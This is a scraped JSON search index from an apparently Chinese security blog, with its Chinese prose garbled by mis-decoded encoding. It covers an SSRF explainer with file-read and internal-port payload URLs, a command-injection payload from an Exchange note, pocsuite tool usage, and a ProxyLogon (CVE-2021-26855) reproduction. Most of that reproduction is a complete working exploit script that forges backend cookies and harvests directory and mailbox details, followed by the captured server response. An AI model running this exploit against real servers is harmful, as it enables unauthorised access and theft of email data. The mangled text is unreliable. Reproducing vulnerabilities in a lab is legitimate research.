çª—å£ä¸‹è¿è¡Œï¼Œä½†æ˜¯å®é™…ä¸Š-cå®é™…ä¸ºâ€œè¿è¡Œâ€çš„å†…å®¹ï¼Œå› æ­¤ç›´æ¥echoæ˜¯ä¸è¡Œçš„ï¼Œéœ€è¦ -c &quot;cmd /c echo test &gt; C:\\1.txt&quot;ï¼Œç»æµ‹è¯•æˆåŠŸåˆ›å»ºæ–‡ä»¶ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š URL Encodeç¼–ç  å¯¹ç”Ÿæˆçš„payloadç¼–ç æ—¶ï¼Œéœ€è¦æ³¨æ„åªç¼–ç å…³é”®çš„ç‰¹æ®Šå­—ç¬¦å³å¯ï¼Œå¦‚æœå…¨ç¼–ç çš„è¯ä¼šæ— æ³•åˆ©ç”¨æˆåŠŸã€‚ æ¼æ´åˆ†æ","tags":[{"name":"POC","slug":"POC","permalink":"https://hodlyounger.github.io/tags/POC/"},{"name":"POC/RCE","slug":"POC-RCE","permalink":"https://hodlyounger.github.io/tags/POC-RCE/"},{"name":"exchange","slug":"exchange","permalink":"https://hodlyounger.github.io/tags/exchange/"}],"categories":[{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POCæ¢ç´¢","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"},{"name":"Exchange","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢/Exchange","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/Exchange/"}]},{"title":"SSRFæ¼æ´","date":"2024-06-03T09:10:00.393Z","path":"E_æ‰‹å†Œ/æ¼æ´è¯´æ˜/ã€æ¼æ´ã€‘SSRF/","text":"æ¦‚è¿°ï¼šSSRFæ¼æ´è¯´æ˜ï¼ŒåŸç†ã€æŒ–æ˜ç‚¹ã€æ¼æ´åˆ©ç”¨ã€ä¿®å¤å»ºè®® 0x01 ä»‹ç»SSRFæ¼æ´ SSRF (Server-Side Request Forgery,æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„å®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRF æ”»å‡»çš„ç›®æ ‡æ˜¯å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿ(æ­£å› ä¸ºè¯·æ±‚æ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥æœåŠ¡ç«¯èƒ½è¯·æ±‚åˆ°ä¸è‡ªèº«ç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿ)ã€‚ é€šä¿—çš„è¯´ï¼šå°±æ˜¯æˆ‘ä»¬ä¼ é€’å‚æ•°ï¼ŒæœåŠ¡å™¨ä»£æ›¿æˆ‘ä»¬å»è®¿é—®ã€‚ 0x02 SSRFæ¼æ´åŸç† SSRFçš„å½¢æˆå¤§å¤šæ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œé»‘å®¢æ“ä½œæœåŠ¡ç«¯ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ç­‰ï¼Œåˆ©ç”¨çš„æ˜¯æœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€ ã€‚SSRFåˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„Web åº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚ ä¸»è¦æ”»å‡»æ–¹å¼å¦‚ä¸‹æ‰€ç¤ºã€‚ å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„bannerä¿¡æ¯ã€‚ æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åºã€‚ å¯¹å†…ç½‘Webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œè¯†åˆ«ä¼ä¸šå†…éƒ¨çš„èµ„äº§ä¿¡æ¯ã€‚ æ”»å‡»å†…å¤–ç½‘çš„Webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨HTTP GETè¯·æ±‚å°±å¯ä»¥å®ç°çš„æ”»å‡»(æ¯”å¦‚struts2ã€SQliç­‰)ã€‚ åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰ã€‚ http://payloads.net/ssrf.php?url=192.168.1.10:3306 http://payloads.net/ssrf.php?url=file:///c:/windows/win.ini SSRF æ¼æ´éªŒè¯æ–¹å¼ æ’é™¤æ³•ï¼šæµè§ˆå™¨f12æŸ¥çœ‹æºä»£ç çœ‹æ˜¯å¦æ˜¯åœ¨æœ¬åœ°è¿›è¡Œäº†è¯·æ±‚ æ¯”å¦‚ï¼šè¯¥èµ„æºåœ°å€ç±»å‹ä¸º http://www.xxx.com/a.php?image=URL,URLå‚æ•°è‹¥æ˜¯å…¶ä»–æœåŠ¡å™¨åœ°å€å°±å¯èƒ½å­˜åœ¨SSRFæ¼æ´ dnslogç­‰å·¥å…·è¿›è¡Œæµ‹è¯•ï¼Œçœ‹æ˜¯å¦è¢«è®¿é—®(å¯ä»¥åœ¨ç›²æ‰“åå°ï¼Œç”¨ä¾‹ä¸­å°†å½“å‰å‡†å¤‡è¯·æ±‚çš„urlå’Œå‚æ•°ç¼–ç æˆbase64ï¼Œè¿™æ ·ç›²æ‰“åå°è§£ç åå°±çŸ¥é“æ˜¯å“ªå°æœºå™¨å“ªä¸ªcgiè§¦å‘çš„è¯·æ±‚) æŠ“åŒ…åˆ†æå‘é€çš„è¯·æ±‚æ˜¯ä¸æ˜¯é€šè¿‡æœåŠ¡å™¨å‘é€çš„ï¼Œå¦‚æœä¸æ˜¯å®¢æˆ·ç«¯å‘å‡ºçš„è¯·æ±‚ï¼Œåˆ™æœ‰å¯èƒ½æ˜¯å­˜åœ¨æ¼æ´ã€‚æ¥ç€æ‰¾å­˜åœ¨HTTPæœåŠ¡çš„å†…ç½‘åœ°å€ ä»æ¼æ´å¹³å°ä¸­çš„å†å²æ¼æ´å¯»æ‰¾æ³„æ¼çš„å­˜åœ¨webåº”ç”¨å†…ç½‘åœ°å€ é€šè¿‡äºŒçº§åŸŸåæš´åŠ›çŒœè§£å·¥å…·æ¨¡ç³ŠçŒœæµ‹å†…ç½‘åœ°å€ é€šè¿‡fileåè®®è¯»å–å†…ç½‘ä¿¡æ¯è·å–ç›¸å…³åœ°å€ ç›´æ¥è¿”å›çš„Bannerã€titleã€contentç­‰ä¿¡æ¯ ç•™æ„å¸ƒå°”å‹SSRFï¼Œé€šè¿‡åˆ¤æ–­ä¸¤æ¬¡ä¸åŒè¯·æ±‚ç»“æœçš„å·®å¼‚æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨SSRFï¼Œç±»ä¼¼å¸ƒå°”å‹sqlç›²æ³¨æ–¹æ³•ã€‚ 0x04 SSRF æ¼æ´åˆ©ç”¨æ–¹å¼ èƒ½æ‰«æå†…éƒ¨ç½‘ç»œï¼Œè·å–ç«¯å£ï¼ŒæœåŠ¡ä¿¡æ¯ã€‚ æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åºã€‚ å¯¹å†…ç½‘ web è¿›è¡ŒæŒ‡çº¹è¯†åˆ« å¯¹å†…éƒ¨ä¸»æœºå’Œç«¯å£å‘é€è¯·æ±‚åŒ…è¿›è¡Œæ”»å‡» file åè®®è¯»å–æœ¬åœ°æ–‡ä»¶ 0x05 SSRF æ¼æ´æŒ–ç‚¹ ç¤¾äº¤åˆ†äº«åŠŸèƒ½ï¼šè·å–è¶…é“¾æ¥çš„æ ‡é¢˜ç­‰å†…å®¹è¿›è¡Œæ˜¾ç¤º è½¬ç æœåŠ¡ï¼šé€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•æµè§ˆ åœ¨çº¿ç¿»è¯‘ï¼šç»™ç½‘å€ç¿»è¯‘å¯¹åº”ç½‘é¡µçš„å†…å®¹ å›¾ç‰‡åŠ è½½/ä¸‹è½½ï¼šä¾‹å¦‚å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ä¸­çš„ç‚¹å‡»ä¸‹è½½å›¾ç‰‡åˆ°æœ¬åœ°ï¼›é€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡ å›¾ç‰‡/æ–‡ç« æ”¶è—åŠŸèƒ½ï¼šä¸»è¦å…¶ä¼šå–URLåœ°å€ä¸­titleä»¥åŠæ–‡æœ¬çš„å†…å®¹ä½œä¸ºæ˜¾ç¤ºä»¥æ±‚ä¸€ä¸ªå¥½çš„ç”¨å…·ä½“éªŒ äº‘æœåŠ¡å‚å•†ï¼šå®ƒä¼šè¿œç¨‹æ‰§è¡Œä¸€äº›å‘½ä»¤æ¥åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜æ´»ç­‰ï¼Œæ‰€ä»¥å¦‚æœå¯ä»¥æ•è·ç›¸åº”çš„ä¿¡æ¯ï¼Œå°±å¯ä»¥è¿›è¡Œssrfæµ‹è¯• ç½‘ç«™é‡‡é›†ï¼Œç½‘ç«™æŠ“å–çš„åœ°æ–¹ï¼šä¸€äº›ç½‘ç«™ä¼šé’ˆå¯¹ä½ è¾“å…¥çš„urlè¿›è¡Œä¸€äº›ä¿¡æ¯é‡‡é›†å·¥ä½œ æ•°æ®åº“å†…ç½®åŠŸèƒ½ï¼šæ•°æ®åº“çš„æ¯”å¦‚mongodbçš„copyDatabaseå‡½æ•° é‚®ä»¶ç³»ç»Ÿï¼šæ¯”å¦‚æ¥æ”¶é‚®ä»¶æœåŠ¡å™¨åœ°å€ ç¼–ç å¤„ç†, å±æ€§ä¿¡æ¯å¤„ç†ï¼Œæ–‡ä»¶å¤„ç†ï¼šæ¯”å¦‚ffpmgï¼ŒImageMagickï¼Œdocxï¼Œpdfï¼Œxmlå¤„ç†å™¨ç­‰ æœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–æ‰©å±•è°ƒç”¨URLçš„åŠŸèƒ½ï¼šå¯ä»¥åˆ©ç”¨google è¯­æ³•åŠ ä¸Šè¿™äº›å…³é”®å­—å»å¯»æ‰¾SSRFæ¼æ´ ä»è¿œç¨‹æœåŠ¡å™¨è¯·æ±‚èµ„æºï¼ˆupload from url å¦‚discuzï¼ï¼›import &amp; expost rss feed å¦‚web blogï¼›ä½¿ç”¨äº†xmlå¼•æ“å¯¹è±¡çš„åœ°æ–¹ å¦‚wordpress xmlrpc.phpï¼‰ 0x06 SSRF ç›¸å…³æ¼æ´ CVE-2021-26855","tags":[{"name":"æ¼æ´","slug":"æ¼æ´","permalink":"https://hodlyounger.github.io/tags/%E6%BC%8F%E6%B4%9E/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"æ¼æ´è¯´æ˜","slug":"E-æ‰‹å†Œ/æ¼æ´è¯´æ˜","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E/"}]},{"title":"ã€POCã€‘pocsuite ç”¨æ³•","date":"2024-06-03T09:10:00.379Z","path":"B_Code/Python/ã€POCã€‘pocsuite ç”¨æ³•/","text":"æ¦‚è¿°ï¼špocsuite å·¥å…·çš„ç”¨æ³•æ•´ç† å‚è€ƒé“¾æ¥ï¼š å·¥å…·| PocSuite ä½¿ç”¨ä»‹ç» - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· Pocsuite3 | Open source remote vulnerability testing framework å®‰è£… 1234# pippip install pocsuite# pdmpdm add pocsuite å®‰è£…å®Œæˆä¹‹åè¿˜è¦å®‰è£… setuptoolsï¼Œå¦‚æœä¸å®‰è£…ï¼Œåˆ™ä¼šæŠ¥é”™ ModuleNotFoundError: No module named 'pkg_resources' 1234# pippip install setuptools# pdmpdm add setuptools ä½¿ç”¨ ä½¿ç”¨ pdm è¿è¡Œæ—¶ï¼Œå¿…é¡»æŒ‡å®š POC çš„å…¨è·¯å¾„ã€‚ 123456789101112131415161718192021222324Administrator@5CD227B8LV MINGW64 /d/Documents/A_Source/OpenSource/POC/Library-POC/Exchange/CVE-2021-26855 (master)$ pdm run pocsuite -r &quot;D:\\Documents\\A_Source\\OpenSource\\POC\\Library-POC\\Exchange\\CVE-2021-26855\\CVE-2021-26855.py&quot; -u https://192.168.106.145 --verify,------. ,--. ,--. ,----. &#123;2.0.8-247cac4&#125;| .--. &#x27;,---. ,---.,---.,--.,--`--,-&#x27; &#x27;-.,---.&#x27;.-. || &#x27;--&#x27; | .-. | .--( .-&#x27;| || ,--&#x27;-. .-| .-. : .&#x27; &lt;| | --&#x27;&#x27; &#x27;-&#x27; \\ `--.-&#x27; `&#x27; &#x27;&#x27; | | | | \\ --/&#x27;-&#x27; |`--&#x27; `---&#x27; `---`----&#x27; `----&#x27;`--&#x27; `--&#x27; `----`----&#x27; https://pocsuite.org[*] starting at 15:38:32[15:38:32] [INFO] loading PoC script &#x27;D:\\Documents\\A_Source\\OpenSource\\POC\\Library-POC\\Exchange\\CVE-2021-26855\\CVE-2021-26855.py&#x27;[15:38:32] [INFO] pocsusite got a total of 1 tasks[15:38:32] [INFO] running poc:&#x27;Microsoft Exchange Server SSRFæ¼æ´&#x27; target &#x27;https://192.168.106.145&#x27;[15:38:32] [+] URL : https://192.168.106.145:443[15:38:32] [INFO] Scan completed,ready to print+-------------------------+------------------------------------+--------+---------------------------+------------------------------------------------------------------+---------+| target-url | poc-name | poc-id | component | version | status |+-------------------------+------------------------------------+--------+---------------------------+------------------------------------------------------------------+---------+| https://192.168.106.145 | Microsoft Exchange Server SSRFæ¼æ´ | | Microsoft Exchange Server | Exchange Server 2013ã€Exchange Server 2016ã€Exchange Server 2019 | success |+-------------------------+------------------------------------+--------+---------------------------+------------------------------------------------------------------+---------+success : 1 / 1[*] shutting down at 15:38:32","tags":[{"name":"POC","slug":"POC","permalink":"https://hodlyounger.github.io/tags/POC/"},{"name":"Python","slug":"Python","permalink":"https://hodlyounger.github.io/tags/Python/"},{"name":"pocsuite","slug":"pocsuite","permalink":"https://hodlyounger.github.io/tags/pocsuite/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Python","slug":"B-Code/Python","permalink":"https://hodlyounger.github.io/categories/B-Code/Python/"}]},{"title":"ã€CVE-2021-26855ã€‘RCEæ¼æ´","date":"2024-06-02T16:00:00.000Z","path":"A_å†…åŠŸ/A_POCæ¢ç´¢/Exchange/ã€CVE-2021-26855ã€‘RCEæ¼æ´/","text":"æ¦‚è¿°ï¼šExchange CVE-2021-26855 æ¼æ´å¤ç°åŠåˆ†æ ç›¸å…³åˆ†æï¼š Reproducing the Microsoft Exchange Proxylogon Exploit Chain | å…³äºExchange CVE-2021â€“26855ä¸CVE-2021â€“27065æ¼æ´åˆ†æåŠå¤ç° | æ¼æ´ 2021å¹´ä¸‰æœˆï¼Œå¾®è½¯ä¿®å¤äº†Microsoft Exchangeå¤šä¸ªé«˜å±æ¼æ´ã€‚é€šè¿‡ç»„åˆåˆ©ç”¨è¿™äº›æ¼æ´èƒ½å¤Ÿåœ¨æœªç»èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹è¿œç¨‹è·å–ç›®æ ‡æœåŠ¡å™¨æƒé™ã€‚å…¶ä¸­åŒ…æ‹¬ï¼š CVE-2021-26855: æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆSSRFï¼‰æ¼æ´ï¼Œé€šè¿‡è¯¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥å‘é€ä»»æ„HTTPè¯·æ±‚å¹¶é€šè¿‡Exchange Serverè¿›è¡Œèº«ä»½éªŒè¯ï¼Œè·å–æƒé™ã€‚ CVE-2021-26857: æ˜¯ç»Ÿä¸€æ¶ˆæ¯æœåŠ¡ä¸­çš„ä¸å®‰å…¨ååºåˆ—åŒ–æ¼æ´ã€‚é€šè¿‡è¯¥æ­¤æ¼æ´ï¼Œå…·æœ‰ç®¡ç†å‘˜æƒé™çš„æ”»å‡»è€…å¯ä»¥åœ¨ExchangeæœåŠ¡å™¨ä¸Šä»¥SYSTEMèº«ä»½è¿è¡Œä»»æ„ä»£ç ã€‚ CVE-2021-26858/CVE-2021-27065: ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ï¼Œåœ¨é€šè¿‡èº«ä»½éªŒè¯åæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å°†æ–‡ä»¶å†™å…¥æœåŠ¡å™¨çš„ä»»æ„è·¯å¾„ã€‚ æ¼æ´æ— éœ€éªŒè¯å’Œäº¤äº’å³å¯è§¦å‘è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå±å®³æå¤§ã€‚ å½±å“èŒƒå›´ CVE-2021-27065/CVE-2021-26855/CVE-2021-26858ï¼š Microsoft Exchange Server 2019 Cumulative Update 8 Microsoft Exchange Server 2019 Cumulative Update 7 Microsoft Exchange Server 2016 Cumulative Update 19 Microsoft Exchange Server 2016 Cumulative Update 18 Microsoft Exchange Server 2013 Cumulative Update 23 CVE-2021-26857ï¼š Microsoft Exchange Server 2019 Cumulative Update 8 Microsoft Exchange Server 2019 Cumulative Update 7 Microsoft Exchange Server 2016 Cumulative Update 19 Microsoft Exchange Server 2016 Cumulative Update 18 Microsoft Exchange Server 2013 Cumulative Update 23 Microsoft Exchange Server 2010 Service Pack 3 æ¼æ´å¤ç° CVE-2021-26855 CVE-2021â€“26855æ˜¯â¼€ä¸ª SSRF ,åªéœ€è¦èƒ½å¤Ÿè®¿é—® Exchange æœåŠ¡å™¨ï¼Œæ”»å‡»è€…å¯ä»¥ä¸ç»è¿‡ä»»ä½•ç±»å‹çš„èº«ä»½éªŒè¯æ¥åˆ©â½¤æ­¤æ¼æ´ã€‚ç›¸å…³æ¼æ´åœ¨C:\\Program Files\\Microsoft\\ExchangeServer\\V15\\FrontEnd\\HttpProxy\\binç›®å½•ä¸‹çš„Microsoft.Exchange.FrontEndHttpProxy.dll ä½¿ç”¨ pocsuite ç¼–å†™çš„ poc è„šæœ¬å¤ç°æ¼æ´ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137#!/usr/bin/env python3# coding: utf-8from urllib.parse import urljoinfrom collections import OrderedDictfrom pocsuite3.api import POCBase, Output, register_poc, logger, requestsfrom pocsuite3.api import POC_CATEGORY, OptString, REVERSE_PAYLOADfrom requests.packages.urllib3.exceptions import InsecureRequestWarningimport stringimport randomimport tracebackrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)def id_generator(size=6, chars=string.ascii_lowercase + string.digits): return &#x27;&#x27;.join(random.choice(chars) for _ in range(size))class DemoPOC(POCBase): vulID = &#x27;CVE-2021-26855&#x27; version = &#x27;1.0&#x27; author = [&#x27;&#x27;] vulDate = &#x27;2021-03-06&#x27; createDate = &#x27;2021-03-06&#x27; updateDate = &#x27;2021-03-06&#x27; references = [&#x27;&#x27;] name = &#x27;Microsoft Exchange Server SSRFæ¼æ´&#x27; appPowerLink = &#x27;&#x27; appName = &#x27;Microsoft Exchange Server&#x27; appVersion = &#x27;Exchange Server 2013ã€Exchange Server 2016ã€Exchange Server 2019&#x27; vulType = &#x27;&#x27; desc = &#x27;&#x27;&#x27; Microsoft Exchange Server SSRFæ¼æ´ &#x27;&#x27;&#x27; samples = [&#x27;&#x27;] install_requires = [&#x27;&#x27;] def _options(self): o = OrderedDict() o[&quot;email&quot;] = OptString(default=&#x27;administrator@ms.com&#x27;,description=&#x27;ç™»å½•é‚®ç®±&#x27;,require=False) return o def _verify(self): result = &#123;&#125; try: random_name = id_generator(3) + &quot;.js&quot; email = self.get_option(&#x27;email&#x27;) user_agent = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36&quot; autoDiscoverBody = &quot;&quot;&quot;&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt; &lt;Request&gt; &lt;EMailAddress&gt;%s&lt;/EMailAddress&gt; &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt; &lt;/Request&gt; &lt;/Autodiscover&gt; &quot;&quot;&quot; % email FQDN = &quot;EXCHANGE&quot; url = &quot;%s/ecp/%s&quot; % (self.url, random_name) resp = requests.get(url, headers=&#123;&quot;Cookie&quot;: &quot;X-BEResource=localhost~1942062522&quot;, &quot;User-Agent&quot;: user_agent&#125;, verify=False, #proxies=proxies ) if &quot;X-CalculatedBETarget&quot; in resp.headers and &quot;X-FEServer&quot; in resp.headers: FQDN = resp.headers[&quot;X-FEServer&quot;] url = &quot;%s/ecp/%s&quot; % (self.url, random_name) logger.info(&quot;url: %s&quot; % url) resp = requests.post(url, headers=&#123; &quot;Cookie&quot;: &quot;X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;&quot; % FQDN, &quot;Content-Type&quot;: &quot;text/xml&quot;, &quot;User-Agent&quot;: user_agent&#125;, data=autoDiscoverBody, verify=False, #proxies=proxies ) if resp.status_code != 200: logger.error(&quot;[-] Autodiscover Error!&quot;) raise Exception(&quot;Autodiscover Error&quot;) # logger.info(resp.text) logger.info(resp.content.decode(&quot;utf-8&quot;)) if &quot;&lt;LegacyDN&gt;&quot; not in resp.text: logger.error(&quot;[-] Can not get LegacyDN! from &quot; + email) raise Exception(&quot;Can not get LegacyDN! from &quot; + email) legacyDn = resp.text.split(&quot;&lt;LegacyDN&gt;&quot;)[1].split(&quot;&lt;/LegacyDN&gt;&quot;)[0] DisplayName = resp.text.split(&quot;&lt;DisplayName&gt;&quot;)[1].split(&quot;&lt;/DisplayName&gt;&quot;)[0] Address = resp.text.split(&quot;&lt;AutoDiscoverSMTPAddress&gt;&quot;)[1].split(&quot;&lt;/AutoDiscoverSMTPAddress&gt;&quot;)[0] AccountType = resp.text.split(&quot;&lt;AccountType&gt;&quot;)[1].split(&quot;&lt;/AccountType&gt;&quot;)[0] MicrosoftOnline = resp.text.split(&quot;&lt;MicrosoftOnline&gt;&quot;)[1].split(&quot;&lt;/MicrosoftOnline&gt;&quot;)[0] PublicFolderServer = resp.text.split(&quot;&lt;PublicFolderServer&gt;&quot;)[1].split(&quot;&lt;/PublicFolderServer&gt;&quot;)[0] Server = resp.text.split(&quot;&lt;Server&gt;&quot;)[1].split(&quot;&lt;/Server&gt;&quot;)[0] AD = resp.text.split(&quot;&lt;AD&gt;&quot;)[1].split(&quot;&lt;/AD&gt;&quot;)[0] ServerExclusiveConnect = resp.text.split(&quot;&lt;ServerExclusiveConnect&gt;&quot;)[1].split(&quot;&lt;/ServerExclusiveConnect&gt;&quot;)[0] AuthPackage = resp.text.split(&quot;&lt;AuthPackage&gt;&quot;)[1].split(&quot;&lt;/AuthPackage&gt;&quot;)[0] CertPrincipalName = resp.text.split(&quot;&lt;CertPrincipalName&gt;&quot;)[1].split(&quot;&lt;/CertPrincipalName&gt;&quot;)[0] # OWAUrl = resp.text.split(&quot;&lt;OWAUrl AuthenticationMethod=&quot;)[1].split(&quot;&lt;/OWAUrl&gt;&quot;)[0] OOFUrl = resp.text.split(&quot;&lt;OOFUrl&gt;&quot;)[1].split(&quot;&lt;/OOFUrl&gt;&quot;)[0] logger.info(&quot;[+] \\033[32mSuccess!\\033[00m: SSRF Authenticated on Backend Service&quot;) logger.info(&quot;[+] Got details...&quot;) logger.info(&quot;[+] Name: &quot; + DisplayName) logger.info(&quot;[+] DN: &quot; + legacyDn) logger.info(&quot;[+] SMTP Address: &quot; + Address) logger.info(&quot;[+] Account Type: &quot; + AccountType) logger.info(&quot;[+] Microsoft Online status: &quot; + MicrosoftOnline) logger.info(&quot;[+] Public folder Server: &quot; + PublicFolderServer) logger.info(&quot;[+] Server: &quot; + Server) logger.info(&quot;[+] AD: &quot; + AD) logger.info(&quot;[+] Server Exclusive Connect status: &quot; + ServerExclusiveConnect) logger.info(&quot;[+] Authentication Package used: &quot; + AuthPackage) logger.info(&quot;[+] Cert Principal Name status: &quot; + CertPrincipalName) # logger.info(&quot;[+] OWA URL: &quot; + OWAUrl) logger.info(&quot;[+] OOF Url: &quot; + OOFUrl + &quot;\\t&lt;- Use this URL to extract emails, contacts from BackEnd Service&quot;) if len(legacyDn) != 0: result[&#x27;VerifyInfo&#x27;] = &#123;&#125; result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = self.url result[&#x27;VerifyInfo&#x27;][&#x27;legacyDn&#x27;] = legacyDn result[&#x27;VerifyInfo&#x27;][&#x27;AD&#x27;] = AD except Exception as e: logger.error(e) logger.error(traceback.format_exc()) return self.parse_output(result) def _attack(self): return self._verify() def parse_output(self, result): output = Output(self) if result: output.success(result) else: output.fail(&#x27;Internet nothing returned&#x27;) return outputregister_poc(DemoPOC) ä½¿ç”¨ pocsuite è¿è¡Œ pocï¼š 1$ pdm run pocsuite -r &quot;D:\\Documents\\A_Source\\OpenSource\\POC\\Library-POC\\Exchange\\CVE-2021-26855\\CVE-2021-26855 copy.py&quot; -u https://192.168.106.148 --verify --email &quot;zhangsan@ms.test.com&quot; è¯·æ±‚è¿”å›çš„å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/responseschema/2006&quot;&gt; &lt;Response xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt; &lt;User&gt; &lt;DisplayName&gt;å¼ ä¸‰&lt;/DisplayName&gt; &lt;LegacyDN&gt;/o=Sullivan/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=user51a6aff4&lt;/LegacyDN&gt; &lt;AutoDiscoverSMTPAddress&gt;zhangsan@ms.test.com&lt;/AutoDiscoverSMTPAddress&gt; &lt;DeploymentId&gt;617d9d9f-49ee-4ff9-8d88-d5ec6a4bf175&lt;/DeploymentId&gt; &lt;/User&gt; &lt;Account&gt; &lt;AccountType&gt;email&lt;/AccountType&gt; &lt;Action&gt;settings&lt;/Action&gt; &lt;MicrosoftOnline&gt;False&lt;/MicrosoftOnline&gt; &lt;Protocol&gt; &lt;Type&gt;EXCH&lt;/Type&gt; &lt;Server&gt;6a218915-a8ac-4f8b-a6d2-3a99d28b1ba3@ms.test.com&lt;/Server&gt; &lt;ServerDN&gt;/o=Sullivan/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=6a218915-a8ac-4f8b-a6d2-3a99d28b1ba3@ms.test.com&lt;/ServerDN&gt; &lt;ServerVersion&gt;73C18737&lt;/ServerVersion&gt; &lt;MdbDN&gt;/o=Sullivan/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=6a218915-a8ac-4f8b-a6d2-3a99d28b1ba3@ms.test.com/cn=Microsoft Private MDB&lt;/MdbDN&gt; &lt;PublicFolderServer&gt;win-1nmhtjkvjbo.ms.test.com&lt;/PublicFolderServer&gt; &lt;AD&gt;WIN-1NMHTJKVJBO.ms.test.com&lt;/AD&gt; &lt;ASUrl&gt;https://win-1nmhtjkvjbo.ms.test.com/EWS/Exchange.asmx&lt;/ASUrl&gt; &lt;EwsUrl&gt;https://win-1nmhtjkvjbo.ms.test.com/EWS/Exchange.asmx&lt;/EwsUrl&gt; &lt;EmwsUrl&gt;https://win-1nmhtjkvjbo.ms.test.com/EWS/Exchange.asmx&lt;/EmwsUrl&gt; &lt;OOFUrl&gt;https://win-1nmhtjkvjbo.ms.test.com/EWS/Exchange.asmx&lt;/OOFUrl&gt; &lt;UMUrl&gt;https://win-1nmhtjkvjbo.ms.test.com/EWS/UM2007Legacy.asmx&lt;/UMUrl&gt; &lt;ServerExclusiveConnect&gt;off&lt;/ServerExclusiveConnect&gt; &lt;/Protocol&gt; &lt;Protocol&gt; &lt;Type&gt;EXPR&lt;/Type&gt; &lt;Server&gt;win-1nmhtjkvjbo.ms.test.com&lt;/Server&gt; &lt;SSL&gt;Off&lt;/SSL&gt; 